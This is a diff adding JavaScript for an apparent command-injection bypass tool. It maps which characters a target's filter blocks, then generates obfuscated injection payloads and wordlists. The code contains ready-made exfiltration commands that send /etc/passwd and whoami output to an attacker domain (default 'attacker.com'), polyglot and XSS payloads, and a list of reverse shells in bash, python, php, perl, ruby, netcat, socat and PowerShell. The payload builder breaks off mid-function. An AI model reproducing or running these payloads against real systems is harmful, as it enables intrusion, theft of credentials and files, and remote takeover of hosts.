+var ENCODING_TECHNIQUES=[{id:'url',val:'encodeURIComponent',priority:1,chars:[]},{id:'double_url',val:'double_encode',priority:2,chars:[]},{id:'triple_url',val:'triple_encode',priority:3,chars:[]},{id:'base64_full',val:'echo BASE64 | base64 -d | sh',priority:4,chars:['|']},{id:'hex_full',val:"echo -e '\\xNN...' | sh",priority:5,chars:["'",'\\','|']},{id:'octal_full',val:"printf '\\NNN...' | sh",priority:6,chars:["'",'\\','|']},{id:'unicode_norm',val:'%EF%BC%8F',priority:7,chars:[]},{id:'case_random',val:'CaT cAt CAT',priority:8,chars:[]},{id:'comment_insert',val:'cat/**/file',priority:9,chars:['/']},{id:'null_byte_inj',val:'cat%00/file',priority:10,chars:[]}];
+var EXFIL_TECHNIQUES=[{id:'time_based',val:'time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi',priority:1,chars:['$','(',')','[',']','|',';']},{id:'dns_host',val:'for i in $(ls /) ; do host "$i.DOMAIN"; done',priority:2,chars:['$','(',')','/',';','"']},{id:'dns_nslookup',val:'nslookup $(whoami).DOMAIN',priority:3,chars:['$','(',')']},{id:'dns_dig',val:'dig $(cat /etc/passwd|base64).DOMAIN',priority:4,chars:['$','(',')','|','/']},{id:'dns_ping',val:'ping -c 1 $(hostname).DOMAIN',priority:5,chars:['$','(',')']},{id:'http_curl',val:'curl http://DOMAIN/$(whoami)',priority:6,chars:['$','(',')','/',':']},{id:'http_wget',val:'wget http://DOMAIN/$(cat /etc/passwd|base64)',priority:7,chars:['$','(',')','|','/',':']},{id:'icmp_ping',val:'ping -c 1 $(whoami).DOMAIN',priority:8,chars:['$','(',')']},{id:'https_curl',val:'curl -k https://DOMAIN/$(whoami)',priority:9,chars:['$','(',')','/',':']},{id:'post_exfil',val:'curl -X POST -d "data=$(whoami)" http://DOMAIN/collect',priority:10,chars:['$','(',')','/',':','"']}];
+var POLYGLOT_TECHNIQUES=[{id:'quote_agnostic',val:"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",priority:1,chars:[';','$','{','}','#',"'",'"']},{id:'multi_context',val:"/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",priority:2,chars:['$','(',')','`','/',"'",'"','|','#']},{id:'sql_cmd',val:"' OR 1=1;-- ;whoami",priority:3,chars:["'",';']},{id:'xss_cmd',val:"<script>document.location='http://attacker.com/'+$(whoami)<\/script>",priority:4,chars:['<','>','$','(',')','/',"'"]}];
+var REVERSE_SHELLS=[{id:'bash_tcp',val:'bash -i >& /dev/tcp/IP/PORT 0>&1',priority:1,contexts:['linux'],chars:['>','&','/']},{id:'bash_udp',val:'bash -i >& /dev/udp/IP/PORT 0>&1',priority:2,contexts:['linux'],chars:['>','&','/']},{id:'bash_ifs',val:'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/IP/PORT${IFS}0>&1',priority:3,contexts:['linux'],chars:['$','{','}','>','&','/']},{id:'bash_brace',val:'{bash,-i,>&,/dev/tcp/IP/PORT,0>&1}',priority:4,contexts:['linux'],chars:['{','}','>','&','/']},{id:'python_sock',val:"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",priority:5,chars:["'",'"',';','(',')','[',']','/']},{id:'python_ifs',val:"python3${IFS}-c${IFS}'import${IFS}os,pty,socket;s=socket.socket();s.connect((\"IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",priority:6,chars:['$','{','}',"'",'"',';','(',')','[',']','/']},{id:'php_fsock',val:"php -r '$s=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",priority:7,chars:["'",'"',';','(',')','<','>','&','/']},{id:'php_ifs',val:"php${IFS}-r${IFS}'$s=fsockopen(\"IP\",PORT);exec(\"/bin/sh${IFS}-i${IFS}<&3${IFS}>&3${IFS}2>&3\");'",priority:8,chars:['$','{','}',"'",'"',';','(',')','<','>','&','/']},{id:'perl_rev',val:"perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",priority:9,chars:["'",'"','$',';','(',')','/','>','&']},{id:'ruby_rev',val:"ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",priority:10,chars:["'",'"','(',')','/','>','<','&']},{id:'nc_e',val:'nc IP PORT -e /bin/bash',priority:11,chars:['/']},{id:'nc_fifo',val:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f',priority:12,chars:['/','|',';','>','&']},{id:'nc_ifs',val:'rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2>&1|nc${IFS}IP${IFS}PORT${IFS}>/tmp/f',priority:13,chars:['$','{','}','/','|',';','>','&']},{id:'socat',val:"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT",priority:14,chars:["'",':']},{id:'ps_iex',val:"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length)};$c.Close()\"",priority:15,contexts:['windows'],chars:['"','$',"'",'[',']','(',')','|',';','{','}']},{id:'ps_base64',val:'powershell -e dwBoAG8AYQBtAGkA',priority:16,contexts:['windows'],chars:[]}];
+var ALL_DBS={SEPARATORS:SEPARATORS,SPACE_BYPASSES:SPACE_BYPASSES,SLASH_BYPASSES:SLASH_BYPASSES,DOLLAR_BYPASSES:DOLLAR_BYPASSES,QUOTE_BYPASSES:QUOTE_BYPASSES,BACKSLASH_LINUX:BACKSLASH_LINUX,BACKSLASH_WIN_CMD:BACKSLASH_WIN_CMD,BACKSLASH_PS:BACKSLASH_PS,SEMICOLON_BYPASSES:SEMICOLON_BYPASSES,CHAR_SHIFTING:CHAR_SHIFTING,KEYWORD_OBFUSCATION:KEYWORD_OBFUSCATION,ENCODING_TECHNIQUES:ENCODING_TECHNIQUES,EXFIL_TECHNIQUES:EXFIL_TECHNIQUES,POLYGLOT_TECHNIQUES:POLYGLOT_TECHNIQUES,REVERSE_SHELLS:REVERSE_SHELLS};
+
+/* ═══════════════════════════════════════════════════════════
+   CHARS & STATE
+   ═══════════════════════════════════════════════════════════ */
+var CHARS=[{ch:';',name:'Semicolon'},{ch:'|',name:'Pipe'},{ch:'&',name:'Ampersand'},{ch:' ',name:'Space'},{ch:'/',name:'Slash'},{ch:'\\',name:'Backslash'},{ch:'$',name:'Dollar'},{ch:'{',name:'Open Brace'},{ch:'}',name:'Close Brace'},{ch:'(',name:'Open Paren'},{ch:')',name:'Close Paren'},{ch:'`',name:'Backtick'},{ch:"'",name:'Single Qt'},{ch:'"',name:'Double Qt'},{ch:'<',name:'Less Than'},{ch:'>',name:'Greater'},{ch:'#',name:'Hash'},{ch:'!',name:'Exclamation'},{ch:'*',name:'Asterisk'},{ch:'?',name:'Question'},{ch:'~',name:'Tilde'},{ch:'^',name:'Caret'},{ch:'-',name:'Hyphen'}];
+var URL_PROBES=[{ch:'%0a',name:'URL NL',display:'%0a'},{ch:'%09',name:'URL Tab',display:'%09'},{ch:'%0d',name:'URL CR',display:'%0d'},{ch:'%250a',name:'DblEnc NL',display:'%250a'}];
+
+var G_P=[],G_CONV=[],G_DIM=[],G_MASTER=[];
+var state={charStatus:{},workingSeps:[],workingSpaces:[],workingSlashes:[],workingObfs:[],dimResults:{}};
+try{var sv=localStorage.getItem('rubiks5');if(sv){var s=JSON.parse(sv);if(s.charStatus)state={...state,...s};}}catch(e){}
+function save(){try{localStorage.setItem('rubiks5',JSON.stringify(state));}catch(e){}}
+
+/* HELPERS */
+function escH(s){var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
+function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},1800);}
+function B(){return document.getElementById('cfg-base').value||'127.0.0.1';}
+function OOB(){return document.getElementById('cfg-oob').value||'attacker.com';}
+function clip(t){navigator.clipboard.writeText(t).then(function(){toast('Copied!');}).catch(function(){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);toast('Copied!');});}
+function dl(n,c){var b=new Blob([c],{type:'text/plain'});var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=n;a.click();URL.revokeObjectURL(a.href);}
+function safeB64(s){try{return btoa(s);}catch(e){return btoa(unescape(encodeURIComponent(s)));}}
+function filterCtx(a){var os=document.getElementById('cfg-os').value;return a.filter(function(t){if(!t.contexts)return true;return t.contexts.includes('all')||t.contexts.includes(os)||(os==='linux'&&t.contexts.includes('bash'));}).sort(function(a,b){return a.priority-b.priority;});}
+function isBlk(ch){return state.charStatus[ch]==='blocked';}
+function techOk(t){if(!t.chars||!t.chars.length)return true;return t.chars.every(function(c){return !isBlk(c);});}
+
+/* QA */
+function qaCheck(){var total=0;Object.keys(ALL_DBS).forEach(function(k){total+=ALL_DBS[k].length;});document.getElementById('qa').className='qa pass';document.getElementById('qa').textContent='\u2705 15/15 \u2014 '+total;document.getElementById('qa-badge').innerHTML='<span class="badge badge-ok">'+total+'</span>';}
+
+/* NAV */
+function goPage(pg){document.querySelectorAll('.sec').forEach(function(s){s.classList.remove('show');});document.querySelectorAll('.pg').forEach(function(p){p.classList.remove('active');});document.getElementById('pg-'+pg).classList.add('show');document.querySelector('[data-pg="'+pg+'"]').classList.add('active');if(pg==='profile')renderProfile();if(pg==='discover')renderDiscover('sep');if(pg==='solve')renderSolveConfirmed();if(pg==='shell')initShell();if(pg==='ref')renderRef();}
+document.addEventListener('click',function(e){
+  var pg=e.target.closest('.pg');if(pg&&pg.dataset.pg){goPage(pg.dataset.pg);return;}
+  var btn=e.target.closest('button');if(!btn)return;
+  if(btn.dataset.cpIdx!==undefined){clip(G_P[parseInt(btn.dataset.cpIdx)]||'');return;}
+  if(btn.dataset.cvIdx!==undefined){clip(G_CONV[parseInt(btn.dataset.cvIdx)]||'');return;}
+  if(btn.dataset.dmIdx!==undefined){clip(G_DIM[parseInt(btn.dataset.dmIdx)]||'');return;}
+  if(btn.dataset.mIdx!==undefined){clip(G_MASTER[parseInt(btn.dataset.mIdx)]||'');return;}
+  if(btn.dataset.charMark){state.charStatus[btn.dataset.charId]=btn.dataset.charMark;save();renderCharmap();return;}
+  if(btn.dataset.dimMark){var key=btn.dataset.dimKey,mk=btn.dataset.dimMark,dim=btn.dataset.dimDim,tid=btn.dataset.dimTid;state.dimResults[key]=mk;
+    if(mk==='ok'){var lu={sep:{a:SEPARATORS,s:'workingSeps'},space:{a:SPACE_BYPASSES,s:'workingSpaces'},slash:{a:SLASH_BYPASSES,s:'workingSlashes'},kw:{a:KEYWORD_OBFUSCATION,s:'workingObfs'}};var info=lu[dim];if(info){var tech=info.a.find(function(t){return t.id===tid;});if(tech&&!state[info.s].find(function(t){return t.id===tid;}))state[info.s].push(tech);}}
+    var row=document.getElementById('dr-'+key);if(row){row.classList.remove('fmap-ok','fmap-fail');row.classList.add(mk==='ok'?'fmap-ok':'fmap-fail');}save();return;}
+});
+
+/* ═══════════════════════════════════════════════════════════
+   P1: CHARMAP
+   ═══════════════════════════════════════════════════════════ */
+function renderCharmap(){var el=document.getElementById('charmap'),h='';CHARS.concat(URL_PROBES).forEach(function(c){var st=state.charStatus[c.ch]||'unknown';h+='<div class="char-cell '+st+'"><span class="cc-char">'+escH(c.display||c.ch)+'</span><span class="cc-name">'+escH(c.name)+'</span><span class="cc-btns"><button class="btn-xs btn-g" data-char-mark="safe" data-char-id="'+escH(c.ch)+'">\u2713</button><button class="btn-xs btn-r" data-char-mark="blocked" data-char-id="'+escH(c.ch)+'">\u2717</button></span></div>';});el.innerHTML=h;}
+function genCharProbes(){G_P=[];CHARS.forEach(function(c){G_P.push(B()+c.ch);});URL_PROBES.forEach(function(c){G_P.push(B()+c.ch);});clip(G_P.join('\n'));toast(G_P.length+' probes copied');}
+function dlCharProbes(){var p=[];CHARS.forEach(function(c){p.push(B()+c.ch);});URL_PROBES.forEach(function(c){p.push(B()+c.ch);});dl('char_probes.txt',p.join('\n'));}
+function markAllChars(m){CHARS.forEach(function(c){state.charStatus[c.ch]=m;});URL_PROBES.forEach(function(c){state.charStatus[c.ch]=m;});save();renderCharmap();}
+
+/* ═══════════════════════════════════════════════════════════
+   P2: PROFILE
+   ═══════════════════════════════════════════════════════════ */
+function renderProfile(){var h='',blk=[],safe=[];CHARS.concat(URL_PROBES).forEach(function(c){var st=state.charStatus[c.ch];if(st==='blocked')blk.push(c);else if(st==='safe')safe.push(c);});
+  h+='<div class="profile"><h4>Blocked ('+blk.length+')</h4><p>'+(!blk.length?'<span style="color:var(--green)">None!</span>':blk.map(function(c){return '<span style="color:var(--red);font-weight:700;margin-right:6px">'+escH(c.display||c.ch)+'</span>';}).join(''))+'</p></div>';
+  h+='<div class="profile"><h4>Safe ('+safe.length+')</h4><p>'+safe.map(function(c){return '<span style="color:var(--green);margin-right:6px">'+escH(c.display||c.ch)+'</span>';}).join('')+'</p></div>';
+  // Deductions
+  h+='<div class="profile"><h4>\ud83e\udde0 Deductions</h4>';
+  var dd=[];
+  if(isBlk(';')&&!isBlk('%0a'))dd.push('\u2192 Use <b>%0a</b> (newline) as separator');
+  if(isBlk(' ')&&!isBlk('$')&&!isBlk('{'))dd.push('\u2192 Use <b>${IFS}</b> for spaces');
+  if(isBlk(' ')&&isBlk('$')&&!isBlk('%09'))dd.push('\u2192 Use <b>%09</b> (tab) for spaces \u2014 $ blocked so ${IFS} won\'t work');
+  if(isBlk(' ')&&isBlk('$')&&isBlk('%09')&&!isBlk('{'))dd.push('\u2192 Use <b>{cmd,arg}</b> brace expansion');
+  if(isBlk('/')&&!isBlk('$')&&!isBlk('{'))dd.push('\u2192 Use <b>${PATH:0:1}</b> for /');
+  if(isBlk('/')&&isBlk('$'))dd.push('\u2192 Use <b>%2f</b> for / \u2014 $ blocked');
+  if(isBlk("'")&&!isBlk('"'))dd.push('\u2192 Use <b>double-quote split</b> for keyword obfuscation');
+  if(isBlk('"')&&!isBlk("'"))dd.push('\u2192 Use <b>single-quote split</b> for keyword obfuscation');
+  if(isBlk('\\')&&!isBlk('$'))dd.push('\u2192 Use <b>$@</b> insertion instead of backslash split');
+  if(isBlk('|'))dd.push('\u2192 <b>Pipe blocked</b> \u2014 use <<< (here-string) or base64 full-wrap to hide pipes');
+  if(!dd.length)dd.push('Mark characters in Step 1 first.');
+  h+=dd.map(function(d){return '<div class="profile-row">'+d+'</div>';}).join('')+'</div>';
+  // Impact
+  var dims=[['Separators','SEPARATORS'],['Spaces','SPACE_BYPASSES'],['Slashes','SLASH_BYPASSES'],['Dollar $','DOLLAR_BYPASSES'],['Quotes','QUOTE_BYPASSES'],['Backslash','BACKSLASH_LINUX'],['Semicolon','SEMICOLON_BYPASSES'],['Keywords','KEYWORD_OBFUSCATION'],['Char Shift','CHAR_SHIFTING']];
+  h+='<div class="profile"><h4>Technique Viability</h4>';
+  dims.forEach(function(d){var t=filterCtx(ALL_DBS[d[1]]),s=t.filter(techOk).length,p=t.length?Math.round(s/t.length*100):0;h+='<div class="profile-row"><b>'+d[0]+'</b> <span style="color:'+(p>60?'var(--green)':p>30?'var(--amber)':'var(--red)')+'">'+s+'/'+t.length+' ('+p+'%)</span></div>';});
+  h+='</div>';document.getElementById('profile-body').innerHTML=h;}
+function copyProfile(){var l=['=== FILTER PROFILE ==='];CHARS.concat(URL_PROBES).forEach(function(c){l.push((state.charStatus[c.ch]==='blocked'?'[X]':'[OK]')+' '+(c.display||c.ch)+' '+c.name);});clip(l.join('\n'));}
+
+/* ═══════════════════════════════════════════════════════════
+   P3: DISCOVER
+   ═══════════════════════════════════════════════════════════ */
+var DM={sep:{l:'Seps',db:'SEPARATORS',st:'workingSeps'},space:{l:'Space',db:'SPACE_BYPASSES',st:'workingSpaces'},slash:{l:'Slash',db:'SLASH_BYPASSES',st:'workingSlashes'},dollar:{l:'Dollar',db:'DOLLAR_BYPASSES'},quote:{l:'Quotes',db:'QUOTE_BYPASSES'},backslash:{l:'Backslash',db:'BACKSLASH_LINUX'},semi:{l:'Semicolon',db:'SEMICOLON_BYPASSES'},kw:{l:'Keywords',db:'KEYWORD_OBFUSCATION',st:'workingObfs'},charshift:{l:'CharShift',db:'CHAR_SHIFTING'},exfil:{l:'Exfil',db:'EXFIL_TECHNIQUES'}};
+function renderDiscover(dim){var tabs=document.getElementById('dim-tabs'),body=document.getElementById('dim-body'),acts=document.getElementById('dim-acts');
+  tabs.innerHTML=Object.keys(DM).map(function(k){return '<button class="btn btn-xs'+(k===dim?' btn-o':'')+'" onclick="renderDiscover(\''+k+'\')">'+DM[k].l+'</button>';}).join('');
+  var info=DM[dim],techs=filterCtx(ALL_DBS[info.db]),ok=techs.filter(techOk),no=techs.filter(function(t){return!techOk(t);});
+  G_DIM=[];var base=B(),sep=state.workingSeps[0]?state.workingSeps[0].val:'%0a',sp=state.workingSpaces[0]?state.workingSpaces[0].val:' ';
+
+  // Build contextual payloads for EVERY dimension
+  function addP(t){
+    var payloads=[];
+    if(dim==='sep'){
+      if(t.inline){payloads.push(t.id==='backtick'?base+'`whoami`':base+'$(whoami)');}
+      else{payloads.push(base+t.val+'whoami');payloads.push(base+t.val+'id');payloads.push(base+t.val+'ls');}
+    } else if(dim==='space'){
+      if(t.special==='brace_expansion'){payloads.push(base+sep+'{ls,-la}');payloads.push(base+sep+'{cat,/etc/passwd}');}
+      else{payloads.push(base+sep+'ls'+t.val+'-la');payloads.push(base+sep+'cat'+t.val+'/etc/passwd');payloads.push(base+sep+'id'+t.val+'-a');}
+    } else if(dim==='slash'){
+      payloads.push(base+sep+'cat'+sp+t.val+'etc'+t.val+'passwd');
+      payloads.push(base+sep+'ls'+sp+t.val+'tmp');
+      payloads.push(base+sep+'cat'+sp+t.val+'etc'+t.val+'hostname');
+    } else if(dim==='dollar'){
+      // Test $ bypass in context: use it to build ${IFS} or $(cmd)
+      if(t.id==='url') payloads.push(base+sep+'%24(whoami)');
+      else if(t.id==='double_url') payloads.push(base+sep+'%2524(whoami)');
+      else if(t.id==='backtick_alt') payloads.push(base+sep+'`whoami`');
+      else if(t.id==='brace_only'){payloads.push(base+sep+'{whoami,}');payloads.push(base+sep+'{ls,-la}');}
+      else if(t.id==='base64_full'){var b64=safeB64('whoami');payloads.push(base+sep+'echo'+sp+b64+sp+'|'+sp+'base64'+sp+'-d'+sp+'|'+sp+'sh');}
+      else payloads.push(base+sep+t.val);
+      // Extra: test $IFS with this $ bypass
+      if(t.id==='url') payloads.push(base+sep+'ls%24{IFS}-la');
+    } else if(dim==='quote'){
+      // Test quote bypass in keyword obfuscation context
+      if(t.id==='url_single'){payloads.push(base+sep+'w%27h%27o%27am%27i');payloads.push(base+sep+'c%27a%27t'+sp+'/etc/passwd');}
+      else if(t.id==='url_double'){payloads.push(base+sep+'w%22h%22o%22am%22i');payloads.push(base+sep+'c%22a%22t'+sp+'/etc/passwd');}
+      else if(t.id==='split_single'){payloads.push(base+sep+"w'h'o'am'i");payloads.push(base+sep+"c'a't"+sp+"/etc/passwd");}
+      else if(t.id==='split_double'){payloads.push(base+sep+'w"h"o"am"i');payloads.push(base+sep+'c"a"t'+sp+'/etc/passwd');}
+      else if(t.id==='here_doc'){payloads.push(base+sep+'cat'+sp+'<<'+sp+'EOF');}
+      else if(t.id==='echo_escape'){payloads.push(base+sep+'echo'+sp+'-e'+sp+'\\x77\\x68\\x6f\\x61\\x6d\\x69|sh');}
+      else{payloads.push(base+sep+t.val);}
+    } else if(dim==='backslash'){
+      // Test backslash bypass in path and keyword context
+      if(t.id==='url'){payloads.push(base+sep+'w%5choami');payloads.push(base+sep+'c%5c:'+sp+'dir');}
+      else if(t.id==='double_url'){payloads.push(base+sep+'w%255choami');}
+      else if(t.id==='split'){payloads.push(base+sep+'w\\ho\\am\\i');}
+      else if(t.id==='path_obf'){payloads.push(base+sep+'/\\b\\i\\n/////s\\h'+sp+'-c'+sp+'whoami');}
+      else if(t.id==='tr_shift'){payloads.push(base+sep+t.val);}
+      else{payloads.push(base+sep+t.val);}
+    } else if(dim==='semi'){
+      // Test semicolon bypass as an alternative separator
+      if(t.id==='newline_inj'){payloads.push(base+'%0awhoami');payloads.push(base+'%0aid');payloads.push(base+'%0als');}
+      else if(t.id==='cr_inj'){payloads.push(base+'%0dwhoami');payloads.push(base+'%0did');}
+      else if(t.id==='url'){payloads.push(base+'%3bwhoami');payloads.push(base+'%3bid');}
+      else if(t.id==='double_url'){payloads.push(base+'%253bwhoami');payloads.push(base+'%253bid');}
+      else if(t.id==='ls_colors'){payloads.push(base+sep+'${LS_COLORS:10:1}whoami');}
+      else if(t.id==='alt_and'){payloads.push(base+'&&whoami');payloads.push(base+'&&id');}
+      else if(t.id==='alt_or'){payloads.push(base+'||whoami');payloads.push(base+'||id');}
+      else if(t.id==='alt_pipe'){payloads.push(base+'|whoami');payloads.push(base+'|id');}
+      else if(t.id==='backtick_sep'){payloads.push(base+'`whoami`');payloads.push(base+'`id`');}
+      else if(t.id==='subshell_sep'){payloads.push(base+'$(whoami)');payloads.push(base+'$(id)');}
+      else{payloads.push(base+sep+t.val);}
+    } else if(dim==='kw'){
+      // Keyword obfuscation: apply to whoami and cat dynamically
+      var d1=smartObf('whoami',t.id);
+      var d2=smartObf('cat /etc/passwd',t.id);
+      if(d1) payloads.push(base+sep+d1);
+      if(d2) payloads.push(base+sep+d2);
+      if(!d1 && !d2) payloads.push(base+sep+t.val);
+    } else if(dim==='charshift'){
+      // Char shifting: contextual payloads
+      if(t.id==='man_ascii'){payloads.push(base+sep+'man'+sp+'ascii');}
+      else if(t.id==='python_chr'){payloads.push(base+sep+'python'+sp+'-c'+sp+'"print(chr(47))"');payloads.push(base+sep+'$(python'+sp+'-c'+sp+'"print(chr(47))")etc/passwd');}
+      else if(t.id==='perl_chr'){payloads.push(base+sep+'perl'+sp+'-e'+sp+'"print chr(47)"');payloads.push(base+sep+'$(perl'+sp+'-e'+sp+'"print chr(47)")etc/passwd');}
+      else if(t.id==='bash_printf'){payloads.push(base+sep+'$(printf'+sp+'"\\x2f")etc/passwd');}
+      else if(t.id==='bash_echo'){payloads.push(base+sep+'$(echo'+sp+'-e'+sp+'"\\x2f")etc/passwd');}
+      else if(t.id==='tr_range'){payloads.push(base+sep+t.val);}
+      else if(t.id==='arithmetic'){payloads.push(base+sep+'$(printf'+sp+'"\\x$(printf'+sp+'"%x"'+sp+'$((47)))")etc/passwd');}
+      else{payloads.push(base+sep+t.val);}
+    } else if(dim==='exfil'){
+      var oob=OOB();
+      payloads.push(t.val.replace(/DOMAIN/g,oob));
+      // Also with base+sep prefix
+      payloads.push(base+sep+t.val.replace(/DOMAIN/g,oob));
+    } else {
+      payloads.push(base+sep+t.val);
+    }
+    return payloads;
+  }
+
+  var h='<p style="font-size:.68rem;color:var(--green)">'+ok.length+'/'+techs.length+' viable techniques</p><div class="fmap-rows">';
+  ok.forEach(function(t){
+    var payloads=addP(t);
+    payloads.forEach(function(p,pi){
+      var idx=G_DIM.length;G_DIM.push(p);
+      var rk=dim+'_'+t.id+(pi>0?'_'+pi:''),res=state.dimResults[rk];
+      h+='<div class="fmap-row '+(res==='ok'?'fmap-ok':res==='fail'?'fmap-fail':'')+'" id="dr-'+rk+'">';
+      h+='<button class="btn-xs" data-dm-idx="'+idx+'">\ud83d\udccb</button>';
+      h+='<button class="btn-xs btn-g" data-dim-mark="ok" data-dim-key="'+rk+'" data-dim-dim="'+dim+'" data-dim-tid="'+t.id+'">\u2713</button>';
+      h+='<button class="btn-xs btn-r" data-dim-mark="fail" data-dim-key="'+rk+'" data-dim-dim="'+dim+'" data-dim-tid="'+t.id+'">\u2717</button>';
+      h+='<span class="fmap-tag">'+escH(t.id)+(pi>0?'['+pi+']':'')+'</span>';
+      h+='<span class="fmap-pl">'+escH(p)+'</span></div>';
+    });
+  });
+  if(no.length){h+='<div style="padding:4px 8px;font-size:.6rem;color:var(--red);border-top:1px solid var(--border)">ELIMINATED ('+no.length+')</div>';no.forEach(function(t){h+='<div class="fmap-row" style="opacity:.2;text-decoration:line-through"><span class="fmap-tag">'+escH(t.id)+'</span><span class="fmap-pl">'+escH(t.val)+'</span><span class="t-chars" style="color:var(--red)">'+t.chars.filter(isBlk).join(' ')+'</span></div>';});}
+  h+='</div>';body.innerHTML=h;
+  acts.innerHTML='<button class="btn btn-xs btn-o" onclick="clip(G_DIM.join(\'\\n\'));toast(G_DIM.length+\' copied\')">\ud83d\udccb Wordlist ('+G_DIM.length+')</button><button class="btn btn-xs btn-v" onclick="clip(G_DIM.map(encodeURIComponent).join(\'\\n\'))">\ud83d\udd17 URL</button><button class="btn btn-xs" onclick="dl(\'discover.txt\',G_DIM.join(\'\\n\'))">\u2b07</button>';
+}
+
+/* ═══════════════════════════════════════════════════════════
+   P4: RUBIK'S CUBE SOLVER — THE CORE ENGINE
+   ═══════════════════════════════════════════════════════════ */
+function renderSolveConfirmed(){var h='<div style="display:flex;gap:4px;flex-wrap:wrap">';
+  var mk=function(lbl,arr){arr.forEach(function(t){h+='<span class="safe-tag prob-tag" style="border-color:var(--green);color:var(--green)">\u2705 '+lbl+': '+escH(t.id)+'</span>';});};
+  if(state.workingSeps.length)mk('Sep',state.workingSeps);else h+='<span class="prob-tag" style="border-color:var(--amber);color:var(--amber)">Sep: default %0a</span>';
+  if(state.workingSpaces.length)mk('Sp',state.workingSpaces);
+  if(state.workingSlashes.length)mk('Sl',state.workingSlashes);
+  if(state.workingObfs.length)mk('Obf',state.workingObfs);
+  h+='</div>';document.getElementById('solve-confirmed').innerHTML=h;}
+
+function solveCube(){
+  var raw=document.getElementById('solve-cmd').value;if(!raw){toast('Enter a command');return;}
+  var base=B();
+  var seps=state.workingSeps.length?state.workingSeps:[{id:'%0a',val:'%0a'}];
+  var spaces=state.workingSpaces.length?state.workingSpaces:[];
+  var slashes=state.workingSlashes.length?state.workingSlashes:[];
+
+  // ─── LAYER 0: COMMAND ANALYSIS ───
+  var specials=[' ','|',';','&','/','"',"'",'$','\\','`','(',')','{','}','<','>','#','!','*','?','~','^','-'];
+  var found={},problems=[],safe=[];
+  for(var i=0;i<raw.length;i++){var c=raw[i];if(specials.indexOf(c)>=0){if(!found[c])found[c]=0;found[c]++;}}
+  Object.keys(found).forEach(function(c){if(isBlk(c))problems.push(c);else safe.push(c);});
+  var hasSpace=found[' ']>0,hasPipe=found['|']>0,hasSlash=found['/']>0,hasQuote=found["'"]>0||found['"']>0;
+
+  // Build colored analysis
+  var analysisHtml='<b>Command Analysis:</b> ';
+  for(var i=0;i<raw.length;i++){var c=raw[i];if(specials.indexOf(c)>=0){analysisHtml+='<span class="'+(isBlk(c)?'ch-blocked':'ch-safe')+'">'+escH(c)+'</span>';}else{analysisHtml+='<span class="ch-normal">'+escH(c)+'</span>';}}
+  var probHtml='<div class="problems">';
+  problems.forEach(function(c){probHtml+='<span class="prob-tag">\u274c '+escH(c)+' blocked ('+found[c]+'x)</span>';});
+  safe.forEach(function(c){probHtml+='<span class="prob-tag safe-tag">\u2705 '+escH(c)+' safe</span>';});
+  var unknowns=Object.keys(found).filter(function(c){return !isBlk(c)&&state.charStatus[c]!=='safe';});
+  unknowns.forEach(function(c){probHtml+='<span class="prob-tag" style="border-color:var(--amber);color:var(--amber)">\u2753 '+escH(c)+' unknown</span>';});
+  probHtml+='</div>';
+
+  document.getElementById('solve-analysis').style.display='block';
+  document.getElementById('solve-analysis').innerHTML='<div class="cmd-analysis">'+analysisHtml+'</div>'+probHtml;
+
+  // ─── GENERATE STRATEGIES ───
+  G_MASTER=[];
+  var stratHtml='';
+
+  // ─── STRATEGY A: BASE64 FULL-WRAP (hides ALL problem chars) ───
+  var b64=safeB64(raw);
+  var wrappers=[];
+  // bash<<<$(base64 -d<<<ENCODED) — uses $, (, ), < but NO pipe, NO space in command
+  // Apply space bypass to the wrapper's space between "base64" and "-d"
+  var spOptions=spaces.length?spaces:filterCtx(SPACE_BYPASSES).filter(techOk).slice(0,5);
+  if(!spOptions.length)spOptions=[{id:'%09',val:'%09'}];
+  seps.forEach(function(sep){
+    spOptions.forEach(function(sp){
+      // Standard: bash<<<$(base64 SP -d<<<B64)
+      var w='bash<<<$(base64'+sp.val+'-d<<<'+b64+')';
+      var full=sep.inline?(sep.id==='backtick'?base+'`'+w+'`':base+'$('+w+')'):base+sep.val+w;
+      wrappers.push({label:'b64+'+sep.id+'+'+sp.id,payload:full});
+      G_MASTER.push(full);
+    });
+    // eval variant
+    var w2='eval$(base64'+('%09')+'-d<<<'+b64+')';
+    var full2=base+sep.val+w2;wrappers.push({label:'b64eval+'+sep.id,payload:full2});G_MASTER.push(full2);
+  });
